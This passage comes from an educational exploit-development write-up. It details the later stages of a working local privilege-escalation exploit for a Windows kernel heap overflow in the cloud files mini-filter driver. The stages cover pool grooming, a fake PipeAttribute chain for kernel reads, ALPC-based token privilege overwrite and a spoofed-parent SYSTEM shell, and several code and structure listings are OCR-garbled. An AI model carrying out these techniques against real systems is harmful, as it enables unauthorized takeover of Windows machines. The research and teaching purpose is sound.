This stage opens the created reparse point file from Stage 13 using CreateFileW function, which allocates a buffer in the NonPagedPool via ExAllocatedPoolWithTag function with size of 0x1000 bytes. This new allocation fills one of the available holes, overflows it via the same memcpy function (check the vulnerability) and as expected, it corrupts the header of the next and adjacent WNF structure. This behavior is similar to described in Stage 06, but there are differences. The DataSize field has been changed from 0xFF0 to 0xFF8, there is the possibility of reading $0 \\times 0 8$ bytes from the next and adjacent object, which is a HOLE at this moment, but it will be a PipeAttribute structure in Stage 15 rather than a \_KALPC\_RESERVE pointer from Handles array from Stage 06. This time the goal will be read an internal structure address.

The new memory layout, which WNF1 has been corrupted, follows:

\[PipeAttr0\]\[PipeAttr1\]\[PipeAttr2\] \[PipeAttr3\]...

\[OVRF\]\[WNF1\]\[HOLE\]\[WNF3\]\[HOLE\]...

# Stage 15: Fill With Pipe Attributes (Large)

This stage works by expanding the existing PipeAttribute structures from $\\mathtt { 0 \\times 2 0 0 }$ to 0xFD0 bytes, which forces memory reallocation (the old allocation is freed), and as there are a series of holes that have been created in Stage 13, these PipeAttributes structure fill exactly these holes, and will be adjacent to the existing WNF structures, including the corrupted one. The expansion happens by calling NtFsControlFile function with FSCTL\_PIPE\_SET\_PIPE\_ATTRIBUTE, and the array\_data\_pipe follows the same principle explained on Stage 11, where AttributeName is allocated at the start of the data variable part of the PipeAttribute structure (data\[0\]) and AttributeValue is placed at offset 0x20 in the data variable part.

As we already have the current out-of-bound read primitive from Stage 14 (corrupted WNF structure), it is possible to read the first $0 \\times 0 8$ bytes from PipeAttributes structure, which is the Flink pointer to next similar structure. Finally, the new PipeAttribute size of 0xFD0 used during the PipeAttribute expansion can seem controversial, but it is not. These allocations occur in NonPagedPool, there is a fixed POOL\_HEADER with 0x10 bytes, which is followed by the fixed header of the PipeAttribute that has $\\mathtt { 0 } \\times 2 0$ bytes. Therefore, $0 \\times 1 0 0 0$ bytes (hole) - $\_ { 0 \\times 2 0 }$ bytes (fixed PipeAttribute header) - ${ 0 } { \\times 1 0 }$ bytes (POOL\_HEADER) $= =$ 0xFD0 bytes.

The new memory layout is:

▪ freed (small buckets \| 0x200 bytes) \[OVRF\]\[WNF1\]\[PipeAttr0\]\[WNF3\]\[PipeAttr1\]\[WNF5\]\[PipeAttr2\]... (large buckets \| $0 \\times 1 0 0 0$ bytes)

# Stage 16: Find Victim WNF & Leak Pipe

This stage scans the second wave WNF object (from Stage 11, but with its layout updated in Stage 15) to find the corrupted WNF object, whose ChangeStamp is 0xDEAD. Once the code finds it, it can be used to leak a pointer from the next and adjacent PipeAttribute structure. It is the same technique we used in Stage 08, but for that case the target for leaking was a \_KALPC\_RESERVE structure address. Anyway, the code uses NtQueryWnfStateData function to check size and read 0x08 byte of data that is a Flink pointer, which points to the next PipeAttribute structure.

There are a few observations:

g\_leaked\_pipe\_attr: this variable contains the leaked pointer.

g\_victim\_index\_second: this variable contains the index of the corrupted WNF.

wnf\_names\_second\[\]: it is the array that contains WNF\_STATE\_NAME structures that hold handles to the second wave WNF state data objects, and which were used in previous stages (11, and 12) and will be used again in Stage 17.

the fill pattern is 0x52.

# Stage 17: Setup Arbitrary Read (Fake structures)

This stage starts the critical final part of the exploit because it builds a fake PipeAttribute chain in user space, where we can control, and corrupts the Flink pointer, which has been leaked in Stage 17, to force the redirection to the fake structure. Effectively, this procedure will give us an arbitrary kernel read primitive. Based on these facts, the objective is to use NtQueryWnfStateData function and the corrupted WNF structure to overwrite the Flink member from the next and adjacent PipeAttribute structure, as mentioned.

The code can seem a bit complex at the beginning, and I will leave the definition of the structure and comments to help the understanding:

struct PipeAttribute { LIST\_ENTRY list; char\* AttributeName; uint64\_t AttributeValueSize; char\* AttributeValue; char data\[0\];

};

// $\+ \\odot \\times \\odot \\odot$ : Doubly-linked list entry (16 bytes) // $+ \\odot \\times \\perp \\odot$ : Pointer to attribute name string // $+ \\odot \\times \\perp 8$ : Size of attribute value // $+ \\odot \\times 2 \\odot$ : Pointer to attribute value data // $+ \\odot \\times 2 8$ : Flexible array member (inline data)

# The code builds a PipeAttribute structure chain with two fake structures, which obviously follow the structure definition.

memset(g\_fake\_pipe\_attr, 0, sizeof(g\_fake\_pipe\_attr));

memset(g\_fake\_pipe\_attr2, 0, sizeof(g\_fake\_pipe\_attr2)); ULONG64 $\\star$ fake1 $=$ (ULONG64\*)g\_fake\_pipe\_attr;

fake1\[0\] $=$ (ULONG64)g\_fake\_pipe\_attr2;

fake1\[1\] $=$ (ULONG64)g\_leaked\_pipe\_attr;

fake1\[2\] $=$ (ULONG64)g\_fake\_attr\_name;

fake1\[3\] = $\\Theta \\times 3 \\Theta$ ;

fake1\[4\] $=$ (ULONG64)g\_leaked\_kalpc;

fake1\[5\] $=$ 0x6969696969696969ULL;

Each fake structure field is filled with a value, and a few comments can be useful to understand the big picture:

fake1\[0\]: (list.Flink) g\_fake\_pipe\_attr2 points to the user space. We declared both g\_fake\_pipe\_attr and g\_fake\_pipe\_attr2 as global, and they point to user space. Additionally, it was 16-byte aligned because it is required by the kernel for PipeAttribute list entries.

fake1\[1\]: (list.Blink) g\_leaked\_pipe\_attr contains a pointer to the kernel PipeAttribute structure, which has been leaked on Stage 16. The trick is necessary to keep the doubly-linked structure valid. fake1\[2\]: (AttributeName) g\_fake\_attr\_name contains “hackedfakepipe” for AttributeName, and just to be clear, I made up this string.

fake1\[3\]: (AttributeValueSize) it is 0x30 (48 bytes), which allows us to read the full KALPC\_RESERVE structure (0x28 bytes) and some extra bytes. If we tried to expand this value, we would be reading too much.

fake1\[4\]: (AttributeValue): it contains KALPC\_RESERVE address leaked in Stage 08, which will be used as starting address to read the referred $\\mathtt { 0 } \\mathtt { x } 3 0$ bytes and will return the content of

KALPC\_RESERVE structure. In later stages the code will update exactly this member to read content from different addresses.

fake1\[5\]: (data\[0\]) it holds an arbitrary marker.

A similar approach is applied to the second fake PipeAttribute:

ULONG64\* fake2 = (ULONG64\*)g\_fake\_pipe\_attr2;

fake2\[0\] $=$ $\\Theta \\times 7 \\odot 7 \\odot 7 \\odot 7 \\odot 7 \\odot 7 \\odot 7 \\odot 1 \\downarrow \\downarrow ;$ fake2\[1\] $=$ (ULONG64)g\_fake\_pipe\_attr;

fake2\[2\] $=$ (ULONG64)g\_fake\_attr\_name2;

fake2\[3\] = $\\Theta \\times 3 \\Theta$ ;

fake2\[4\] $=$ (ULONG64)g\_leaked\_kalpc;

fake2\[5\] $=$ 0x7171717171717171ULL;

A few observations for each field follow below:

fake2\[0\]: It is a marker used as Flink terminator because there is not a next PipeAttribute object i our fake chain, and we have to know when the chain is over.

fake2\[1\]: it is set to g\_fake\_pipe\_attr, which holds a pointer to the previous fake PipeAttribute object (fake1).

fake2\[2\]: it holds the AttributeName, which has been setup to “alexandre”.

fake2\[3\]: it is $\\mathtt { 0 } \\mathtt { x } 3 0$ , for the same reasons explained previously.

fake2\[4\]: it contains KALPC\_RESERVE address leaked in Stage 08.

fake2\[5\]: it contains an aleatory marker, which is used as data\[0\] content.

The general idea is to link existing and fake PipeAttribute structures according to the following scheme:

▪ Previous and existing kernel PipeAttribute (prevPipeAttribute -- only used here for reference) prevPipeAttribute.Flink: it is corrupted and points to a user-space address (g\_fake\_pipe\_attr), where the fake1 PipeAttribute structure is built.

fake1.Flink: contains a pointer to the fake2 PipeAttribute structure (g\_fake\_pipe\_attr2) fake1.Blink: contains a pointer to the existing kernel PipeAttribute structure.

fake1.AttributeName: “hackedfakepipe”

fake1.AttributeSize: 0x30

fake1.AttributeValue: kernel address (g\_leaked\_kalpc)

Using the current WNF spray, the code calls NtUpdateWnfStateData function to corrupt the next and adjacent object, which is an existing kernel PipeAttribute. In specific, it is the Flink pointer that is corrupted to point to a user-space address (g\_fake\_pipe\_attr), where fake1 PipeAttribute structure is built. The fake1.AttributeName (“hackedfakepipe”) is used as reference to find the fake1 PipeAttribute structure. To be clear:

▪ The existing and corrupted PipeAttribute structure lives in kernel-space. Both fake1 and fake2 PipeAttribute structures live in user-space. The only role of fake2 PipeAttribute structure is to complete and terminate the chain, and make sure that fake1 does not point to anywhere, which unavoidably would cause a crash.

# Stage 18: Verify Arbitrary Read (Kernel read)

This stage searches for the PipeAttribute structure with AttributeName equal to “hackedfakepipe” (saved by g\_fake\_attr\_name variable), which is the fake1 PipeAttribute structure. This process is started by calling NtFsControlFile with FSCTL\_PIPE\_GET\_PIPE\_ATTRIBUTE, which forces the kernel to walk in the doublylinked list via Flink, first passing through existing kernel PipeAttribute structures and, once it reaches the corrupted kernel AttributePipe, whose link.Flink attribute has been corrupted (g\_fake\_pipe\_attr) and points to a fake PipeAttribute structure built in user-space. The kernel continues searching for the PipeAttribute with the provided AttributeName, but it does not know that it is in user-space. As the first structure is fake1 and has exactly the target AttributeName (“hackedpipefake”), it reads $\\mathtt { 0 } \\mathtt { x } 3 0$ bytes from the AttributeValue pointer, which effectively copies $\\mathtt { 0 } \\mathtt { x } \\mathtt { 3 0 }$ bytes from the leaked \_KALPC\_RESERVE to the user-space buffer, whose size is 0x1000 bytes. The returned data follows the \_KALPC\_RESERVE structure format that is refreshed below:

struct \_KALPC\_RESERVE { struct \_ALPC\_PORT\* OwnerPort; // $\\Theta \\times \\Theta \\Theta$ struct \_ALPC\_HANDLE\_TABLE\* HandleTable; // $\\Theta \\times \\Theta 8$ VOID\* Handle; // $\\Theta \\times \\bot \\Theta$ struct \_KALPC\_MESSAGE\* Message; // $\\Theta \\times \\bot 8$ ULONGLONG Size; // $\\Theta \\times 2 \\Theta$ LONG Active; // $\\Theta \\times 2 8$

};

Therefore, fields from returned \_KALPC\_RESERVE structure are stored in the following array positions:

data\[0\] $=$ ALPC\_PORT address

▪ data\[1\] $=$ ALPC\_HANDLE\_TABLE address

▪ data\[2\] $=$ Reserve handle value data\[3\] $=$ KALPC\_MESSAGE address

According to exposed facts so far, it is clear that fake1\[3\] and fake1\[4\] from Stage 17 perform a key role in this context because they dictate the amount of data to read and the address to start reading from, respectively. If we change both fake1\[3\] and fake1\[4\] values and call RefreshPipeCorruption routine, which has been explained previously, it is possible to re-corrupt Flink again, and when the code calls NtFsControlFile function with FSCTL\_PIPE\_GET\_PIPE\_ATTRIBUTE on a corrupted PipeAttribute, the kernel will follow the chain, read from the new address, and return the content to the user-space buffer. Actually, it is always to recommended to call RefreshPipeCorruption routine to ensure that the target PipeAttribute structure is corrupted with the desired value for each read operation. Finally, the data\[0\] contains the ALPC\_PORT structure that will be used for scanning the address of \_EPROCESS structure. All this details will be covered in Stage 19.

# Stage 19: Discover EPROCESS & Token

This stage aims to use the reading primitive obtained in Stage 19 to find our own process, System process, both tokens, which will be used on Stage 20, and also PID of the winlogon.exe that will be used on Stage 21. Soon at the beginning, the code readers $\\mathtt { 0 \\times 2 0 0 }$ bytes from the ALPC\_PORT address (data\[0\]) returned by Stage 18, and from this point the \_EPROCESS discovery procedure adopts two distinct alternatives. The first approach is to try to read at offset $+ 0 \\times 1 8$ of the ALPC\_PORT address, check if the retrieved address is a valid kernel pointer, and also read the ImageFileName field (offset 0x5A8 in \_EPROCESS). If this technique fails then the second approach is try to read $0 \\times 0 8$ bytes at a time and validate if it is possible to retrieve the ImageFileName field. Obviously the first way is better because it is direct, but it does not always work, and parsing and checking each address might be necessary. That is the reason for the second approach is a fallback option of the first one.

A detail that might pass unnoticed is this piece of code:

if (!IsKernelPointer(g\_eprocess\_addr)) { for (int offset $=$ $\\Theta \\times \\bot \\Theta$ ; offset $< =$ $\\Theta \\times 3 8$ ; offset $+ = 8 \\mathrm { \ : }$ ) { ULONG64 candidate $= \\star ( \\mathsf { U L O N G 6 4 } \\star )$ (alpc\_port\_data $^ +$ offset); if (!IsKernelPointer(candidate)) continue;

We have to remember that Stage 18 reads and returns a list of key addresses, and one of the is the ALPC\_PORT address, which has the following structure according to Virgilius Project website:

struct \_ALPC\_PORT

{

struct \_LIST\_ENTRY PortListEntry; //0x0

struct \_ALPC\_COMMUNICATION\_INFO\* CommunicationInfo; //0x10

struct \_EPROCESS $\\star$ OwnerProcess; //0x18

VOID $\\star$ CompletionPort; //0x20

VOID $\\star$ CompletionKey; //0x28

struct \_ALPC\_COMPLETION\_PACKET\_LOOKASIDE $\\star$ CompletionPacketLookaside; //0x30

VOID\* PortContext; //0x38

struct \_SECURITY\_CLIENT\_CONTEXT StaticSecurity; //0x40

struct \_EX\_PUSH\_LOCK IncomingQueueLock; //0x88

struct \_LIST\_ENTRY MainQueue; //0x90

struct \_LIST\_ENTRY LargeMessageQueue; //0xa0

struct \_EX\_PUSH\_LOCK PendingQueueLock; //0xb0

struct \_LIST\_ENTRY PendingQueue; //0xb8

struct \_EX\_PUSH\_LOCK DirectQueueLock; //0xc8

...

The \_ALPC\_PORT is used for scanning the address of the \_EPROCESS structure, which is clearly shown above at offset $+ 0 \\times 1 8$ in this Windows version and build, but can be different in other releases.

Additionally, the code effectively skips the firsts 0x10 bytes (PortListEntry, which is a \_LIST\_ENTRY structure) and starts it searching process from there. At the same way, the upper limit (0x38) is based on fact that PortContext is the last field before a sequence of structures that do not have any information about the address of \_EPROCESS. If this structure suffers deep changes then this upper limit might need to be adjusted.

After retrieving the \_EPROCESS address, a significant amount of data (0x180) is read from the fetched \_EPROCESS address $^ +$ 0x440, which provides information such as UniqueProcessId (offset 0x0), ActiveProcessLinks.Flink (offset 0x08), Token (EX\_FAST\_REF) address (offset 0x78) and ImageFileName (offset 0x168). From the token value, it is necessary to strip its low bits off, which are the reference count, because its structure is EX\_FAST\_REF, and remaining value after this extraction represents the real Token pointer. Having all these process properties, the code searches for the system process (pid $\\scriptstyle = = 4$ ), the own process and the winlogon.exe process. The plan is to modify the Privileges field (token address $+ 0 { \\times } 4 0$ ) from the Token structure in next stage. A relevant point to highlight is that I assume that the target system does not have more than 500 processes, but certainly it might be not be valid in a production environment.

# Stage 20: ALPC Arbitrary Write

This stage is the most important stage of this exploit, and it is where we use the ALPC mechanism via \_KALPC\_RESERVE structure to get an arbitrary write primitive, which will be used to overwrite the \_TOKEN.Privileges to grant all privileges. The general idea is to corrupt an ALPC handle entry to point to fake structures (same approach used in Stage 19) that forces a kernel write operation to an arbitrary location. The \_TOKEN structure shown below:

|     |
| --- |
| struct \_TOKEN { |
|  |
| struct \_TOKEN\_SouRcE TokenSource; //0x0 |
| struct \_LUID TokenId; //0x10 //0x18 |
| struct \_LUID AuthenticationId; struct \_LUID ParentTokenId; //0x20 |
| union \_LARGE\_INTEGER ExpirationTime; //0x28 |
| struct \_ERESOURCE\* TokenLock; //0x30 |
| struct \_LUID ModifiedId; //0x38 |
| struct \_SEP\_TOKEN\_PRIVILEGES Privileges; //0x40 |
| struct \_SEP\_AUDIT\_POLICY AuditPolicy; //0x58 |
| ULONG SessionId; //0x78 |
| ULONG UserAndGroupCount; //0x7c |
|  |

}

To accomplish this task, it is necessary to adopt the same approach from Stage 18 and build fake structures (\_KALPC\_RESERVE and KALPC\_MESSAGE) in the user space, where we can control and access it without having restrictions.

Examining code, you notice that it only proceeds whether requirements are present such as having the reference (g\_victim\_index) to the corrupted WNF structure (Stage 08), a valid token (g\_our\_token), and the handle table address (g\_alpc\_handle\_table\_addr), which has been retrieved in Stage 18. The reason for using the corrupted WNF from Stage 08 is because the corrupted WNF is adjacent to Handles array, which provides address of the resource reserve structure (\_KALPC\_RESERVE). Actually, g\_alpc\_handle\_table\_addr variable holds the address of the \_ALPC\_HANDLE\_TABLE structure, and as its first field is the Handles array, we have the pointer to the first \_KALPC\_RESERVE entry, which is a pointer (0x08 bytes) to the first \_KALPC\_RESERVE of this array. In other words, it is something like:

Entry\[0\] $=$ ptr to KALPC\_RESERVE\_0

Entry\[1\] $=$ ptr to KALPC\_RESERVE\_1

Entry\[2\] $=$ ptr to KALPC\_RESERVE\_2

The critical point is that the g\_victim\_index variable from Stage 08 is reused here because the adjacent object at that stage was exactly the same Handles array, whose address is given by g\_alpc\_handle\_table\_addr variable. Consequently, we can access the specific Handle array, and in special in its first slot (Entry\[0\], which holds a pointer to first \_KALPC\_RESERVE structure whose address has been saved into g\_leaked\_kalpc variable. Using the same procedure, we can also corrupt the first entry of the Handles array to redirect the kernel write operation to another address (like hooking). Moving forward, the code gets the function pointer stored from the first entry, and walk in the \_KALPC\_RESERVE structure to retrieve the kernel message’s address from offset 0x18, whose offset can be checked above:

// $\\Theta \\times 3 \\Theta$ bytes (sizeof)

struct \_KALPC\_RESERVE

{ struct \_ALPC\_PORT\* OwnerPort; //0x0 struct \_ALPC\_HANDLE\_TABLE\* HandleTable; //0x8 VOID\* Handle; //0x10 struct \_KALPC\_MESSAGE\* Message; //0x18 ULONGLONG Size; //0x20 LONG Active; // $\\Theta \\times 2 8$

};

The \_KALPC\_MESSAGE structure has 0x118 bytes and many fields due to unions, but a simplified representation follows below:

|     |     |     |     |     |     |     |
| --- | --- | --- | --- | --- | --- | --- |
|  | struct \_KALPC\_MESSAGE |  |  |  |  |  |
| { |  |  |  |  |  |  |
|  |  |  |  | struct \_LIST\_ENTRy Entry; |  | //0x0 |
|  |  |  |  | struct \_ALPC\_PORT\* PortQueue; |  | //0x10 |
|  |  |  |  | struct \_ALPC\_PORT\* OwnerPort; |  | //0x18 |
|  | union |  |  | struct \_ETHREAD\* WaitingThread; |  | //0x20 |
| { |  |  |  |  |  |  |
| { | struct |  |  |  |  |  |
|  |  |  |  | ULONG QueueType:3; |  | //0x28 |
|  |  |  |  | ULONG QueuePortType:4; |  | //0x28 |
| }; |  |  |  |  |  |  |
|  |  |  |  | struct \_ALPC\_PORT\* CancelSequencePort; |  |  |
|  |  |  |  | struct \_ALPC\_PORT\* CancelQueuePort; |  | //0x38 |
|  |  |  | LONG CancelSequenceNo; |  |  | //0x40 |
|  |  |  |  | struct \_LIST\_ENTRY CancelListEntry; |  | //0x48 |
|  |  |  |  | struct \_KALPC\_RESERVE\* Reserve; |  | //0x50 |
|  |  |  |  |  |  | //0x60 |
|  |  |  |  | struct \_KALPC\_MESSAGE\_ATTRIBUTES MessageAttributes; |  | //0x68 |

# [https://exploitreversing.com](https://exploitreversing.com/)

VOID\* DataUserVa; //0xb0

struct \_ALPC\_COMMUNICATION\_INFO $\\star$ CommunicationInfo; //0xb8

struct \_ALPC\_PORT $\\star$ ConnectionPort; //0xc0

struct \_ETHREAD\* ServerThread; //0xc8

VOID\* WakeReference; //0xd0

VOID $\\star$ WakeReference2; //0xd8

VOID $\\star$ ExtensionBuffer; //0xe0

ULONGLONG ExtensionBufferSize; //0xe8

struct \_PORT\_MESSAGE PortMessage; //0xf0

};

Once we have \_KALPC\_MESSAGE structure address, the next step is to build a fake KALPC\_RESERVE and \_KALPC\_MESSAGE structures that will be stored in user-space, where we have full control and access. To accomplish this task, the declared fakeKalpcReserve is populated with the same values fetched from fields of the first \_KALPC\_RESERVE of Handles array. However, the devil is in details because instead of using the address of the real \_KALPC\_MESSAGE structure, it is used the address of the fakeKalpcMessage, which is built soon below in the code. The number of active \_KALPC\_RESERVE is one because we are using only this one. The fakeKalpcMessage is also populated, but the only relevant field is Reserve, which contains fake \_KALPC\_RESERVE structure’s address and ExtensionBuffer, which holds \_TOKEN.Privilege address. The ExtensionBufferSize covers only Present and Enabled fields from \_SEP\_TOKEN\_PRIVILEGES because we are not interested in EnabledByDefault field

The following task the code writes the address of the fake \_KALPC\_RESERVE structure (fakeKalpcReserve) over the first and real \_KALPC\_RESERVE structure from the Handles array, effectively changing the structure and, as consequence, the \_KALPC\_MESSAGE structure too, which is the fake one now. Once the first entry of the Handle arrays has been changed, an ALPC message is prepared and sent (via NtAlpcSendWaitReceivePort function) to all ports that can hold the corrupted Handles array. The mechanism is interesting because once the ALPC message is sent, the kernel looks up the first \_KALPC\_RESERVE structure from array (fakeKalpcReserve) and reads its content as well as the content of the fake \_KALPC\_MESSAGE (fakeKalpcMessage). Afterwards, the kernel copies the message data content to ExtensionBuffer field, which effectively changes both fields Present and Enabled from Token.Privileges to 0xFFFFFFFFFFFFFFFF, which enables and grants all privileges.

The final part of this stage uses NtOpenProcess function to open winlogon.exe process with process id returned in Stage 19, and if it is successful then the privilege escalation is confirmed.

# Stage 21: Spawn SYSTEM Shell

This is the final stage, where we use the elevated and granted privilege from Stage 20 and spawn a new cmd.exe process running as System. This approach can be repeated to other exploits if we have all necessary privileges. Soon at the beginning, it is necessary to open (OpenProcessToken function) the token associated with the current process to adjust privileges (LookupPrivilegeValueW and AdjustTokenPrivileges functions) to add SeDebugPrivilege, which allows the code to open any process (as winlogon.exe, for example) without considering any respective security descriptor. Therefore, we can open winlogon process via NtOpenProcess function and use it as parent of our process because winlogon.exe runs as System user and, obviously, it exists on Windows system. The following code involving InitializeProcThreadAttributeList and UpdateProcThreadAttribute functions is a typical parent spoofing technique, where we setup the

parent of the current process (our exploit) as being the winlogon process, and our exploit inherits mainly the security token and process environment. Finally, the exploit can create (CreateProcessW function) a cmd process, which also will run as SYSTEM.

Once again, this exploit has been successfully executed, and the elevation of privilege has been tested and reached on Windows 10 22H2 (Build 19045), Windows 11 22H2 (Build 22621) and 23H2 (Build 22631).

# 17\. References

For readers that might be interested in learning details about topics mentioned here, a brief list of valuable resources follows below:

Microsoft Learn: [https://learn.microsoft.com/en-us/windows-hardware/drivers/](https://learn.microsoft.com/en-us/windows-hardware/drivers/) Windows drivers samples: [https://github.com/Microsoft/Windows-driver-samples](https://github.com/Microsoft/Windows-driver-samples) Windows Internals ${ \\boldsymbol { 7 } } ^ { \\mathrm { t h } }$ edition book (Parts 1 and 2) by Pavel Yosifovich , Alex Ionescu, Mark Russinovich, David Solomon, and Andrea Allievi. Practical Reverse Engineering by Bruce Dang, Alexandre Gazet and Elias Bachaalany.

Developing Drivers with the Windows Driver Foundation by Penny Orwick. Virgilius Project: [https://www.vergiliusproject.com/](https://www.vergiliusproject.com/) Windows Classic Samples \| Cloud Mirror: [https://github.com/Microsoft/Windows-classicsamples/tree/main/Samples/CloudMirror](https://github.com/Microsoft/Windows-classicsamples/tree/main/Samples/CloudMirror) Scoop the Windows 10 pool! (by Corentin Bayet and Paul Fariello): [https://www.sstic.org/media/SSTIC2020/SSTICactes/pool\_overflow\_exploitation\_since\_windows\_10\_19h1/SSTIC2020-Articlepool\_overflow\_exploitation\_since\_windows\_10\_19h1-bayet\_fariello.pdf](https://www.sstic.org/media/SSTIC2020/SSTICactes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Articlepool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf)

▪ The Next Generation of Windows Exploitation: Attacking the Common Log File System (ShiJie Xu/@ThunderJ17, Jianyang Song/@SecBoxer and Linshuang Li): [https://i.blackhat.com/Asia22/Friday-Materials/AS-22-Xu-The-Next-Generation-of-Windows-Exploitation-Attacking-theCommon-Log-File-System.pdf](https://i.blackhat.com/Asia22/Friday-Materials/AS-22-Xu-The-Next-Generation-of-Windows-Exploitation-Attacking-theCommon-Log-File-System.pdf) All I Want for Christmas is a CVE-2024-30085 Exploit (by Cherie-Anne Lee): [https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/](https://starlabs.sg/blog/2024/all-i-want-for-christmas-is-a-cve-2024-30085-exploit/) Exploitation of a kernel pool overflow from a restrictive chunk size (CVE-2021-31969) (by Chen Le Qi): [https://starlabs.sg/blog/2023/11-exploitation-of-a-kernel-pool-overflow-from-a-restrictivechunk-size-cve-2021-31969/](https://starlabs.sg/blog/2023/11-exploitation-of-a-kernel-pool-overflow-from-a-restrictivechunk-size-cve-2021-31969/) Windows Kernel Heap Part 1: Segment heap in windows kernel (by Angelboy): [https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-partPlaying](https://speakerdeck.com/scwuaptx/windows-kernel-heap-segment-heap-in-windows-kernel-partPlaying) with the Windows Notification Facility (WNF) (by Gabrielle Viala): [https://blog.quarkslab.com/playing-with-the-windows-notification-facility-wnf.html](https://blog.quarkslab.com/playing-with-the-windows-notification-facility-wnf.html) CVE-2021-31956 Exploiting the Windows Kernel (NTFS with WNF) – Part 1 (by Alex Plaskett): [https://www.nccgroup.com/research-blog/cve-2021-31956-exploiting-the-windows-kernel-ntfswith-wnf-part-1/](https://www.nccgroup.com/research-blog/cve-2021-31956-exploiting-the-windows-kernel-ntfswith-wnf-part-1/) SSD Advisory – cldflt Heap-based Overflow (PE) (by Alex Birnberg) : [https://ssddisclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/](https://ssddisclosure.com/ssd-advisory-cldflt-heap-based-overflow-pe/) Hunting for Bugs in Windows Mini-Filter Drivers (James Forshaw): [https://projectzero.google/2021/01/hunting-for-bugs-in-windows-mini-filter.html](https://projectzero.google/2021/01/hunting-for-bugs-in-windows-mini-filter.html)

Guest Revolution: Chaining 3-bugs to compromise the Windows kernel from the VMware guest (by Junoh Lee, Gwangun Jung) : [https://i.blackhat.com/EU-24/Presentations/EU24-Lee-GuestRevolution.pdf](https://i.blackhat.com/EU-24/Presentations/EU24-Lee-GuestRevolution.pdf) Windows Heap-Backed Pool (by Yarden Shafir): [https://i.blackhat.com/USA21/WednesdayHandouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf](https://i.blackhat.com/USA21/WednesdayHandouts/us-21-Windows-Heap-Backed-Pool-The-Good-The-Bad-And-The-Encoded.pdf) Sheep Year Kernel Heap Fengshui: Spraying in the Big Kids’ Pool (by Alex Ionescu): [https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/](https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/)

# 18\. Conclusion

This article offered a really deep dive in analyzing and writing a N-day exploit for a real-world mini-filter driver (cldflt.sys), which presented different checks and restrictions up to reach the vulnerable code. Afterwards, the task was building a working exploit piece by piece and trying to understand what each stages was really doing. A possible summary for any exploitation case is as follows below:

Get a general understanding of the target program. Perform binary diffing whether you have the previous version.

▪ Find a vulnerability using different resources of code analysis or fuzzing.

▪ Perform reverse engineering of the code and do appropriate markups.

▪ Get a deep understanding of the code and their restrictions.

▪ Write a proof of concept that reaches the vulnerable code and exposes the vulnerability. Get further information by executing dynamic analysis and instrumentation. Plan all stages of the exploit. If it is necessary, expand the initial proof of concept that shows that the target crash under the vulnerability conditions.

▪ Write each stage of the exploit and test it multiple times.

▪ During the exploit development process, try to find and test multiple primitives.

▪ Review all stages of the exploit to ensure that it is coherent. Test the whole exploit multiple times and, if it is possible, in multiple environments. Write a detailed document of the exploit to be sure that all stages are logically consistent.

There are other comments that could be done or included in the list above, but it is reasonable draft that can be used as starting point.

Sincerely, I hope you have learned a bit about the real journey of investigating N-day vulnerability in depth, understanding each technique detail and developing an exploit.

Just in case you want to stay connected:

Twitter: @ale\_sp\_brazil Blog: [https://exploitreversing.com](https://exploitreversing.com/)

Keep reversing and I see you at next time!